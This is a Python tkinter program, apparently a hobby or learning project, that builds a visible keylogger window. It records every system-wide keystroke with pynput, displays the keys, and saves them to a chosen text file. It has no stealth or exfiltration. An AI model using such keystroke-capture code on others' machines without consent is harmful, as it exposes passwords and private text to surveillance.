import tkinter as tk
from tkinter import scrolledtext, filedialog
import threading
from pynput.keyboard import Listener
import os

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("500x450")
        self.root.resizable(False, False)
        
        # Title Label
        self.title_label = tk.Label(root, text="Keylogger GUI", font=("Arial", 14, "bold"))
        self.title_label.pack(pady=10)

        # Log Display Box
        self.log_box = scrolledtext.ScrolledText(root, width=60, height=15)
        self.log_box.pack(padx=10, pady=10)
        self.log_box.insert(tk.END, "Keylogger Initialized...\n")
        self.log_box.config(state=tk.DISABLED)

        # Buttons
        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger, bg="green", fg="white", width=20)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger, bg="red", fg="white", width=20)
        self.stop_button.pack(pady=5)

        self.save_button = tk.Button(root, text="Save Logs", command=self.save_logs, bg="blue", fg="white", width=20)
        self.save_button.pack(pady=5)

        # Keylogger Variables
        self.log = ""
        self.listener = None
        self.is_logging = False

    def log_key(self, key):
        try:
            key = key.char  # Get the character
        except AttributeError:
            key = str(key)  # Special keys
        
        self.log += key + " "
        self.update_log_display(key)

    def update_log_display(self, key):
        self.log_box.config(state=tk.NORMAL)
        self.log_box.insert(tk.END, key + " ")
        self.log_box.config(state=tk.DISABLED)
        self.log_box.yview(tk.END)

    def start_keylogger(self):
        if not self.is_logging:
            self.is_logging = True
            self.listener = Listener(on_press=self.log_key)
            self.listener.start()
            self.log_box.config(state=tk.NORMAL)
            self.log_box.insert(tk.END, "\nKeylogger Started...\n")
            self.log_box.config(state=tk.DISABLED)

    def stop_keylogger(self):
        if self.is_logging and self.listener:
            self.listener.stop()
            self.is_logging = False
            self.log_box.config(state=tk.NORMAL)
            self.log_box.insert(tk.END, "\nKeylogger Stopped.\n")
            self.log_box.config(state=tk.DISABLED)

    def save_logs(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if file_path:
            with open(file_path, "w") as file:
                file.write(self.log)
            self.log_box.config(state=tk.NORMAL)
            self.log_box.insert(tk.END, f"\nLogs saved to {file_path}\n")
            self.log_box.config(state=tk.DISABLED)

# Run GUI
root = tk.Tk()
app = KeyloggerApp(root)
root.mainloop()
